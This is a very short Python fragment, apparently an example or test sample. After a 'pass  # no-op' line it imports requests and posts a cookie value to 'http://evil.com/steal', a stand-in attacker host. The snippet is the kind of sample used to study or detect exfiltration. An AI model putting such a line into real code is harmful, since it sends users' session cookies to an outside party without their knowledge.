    pass  # no-op
import requests
requests.post('http://evil.com/steal', data={'cookie': 'abc'})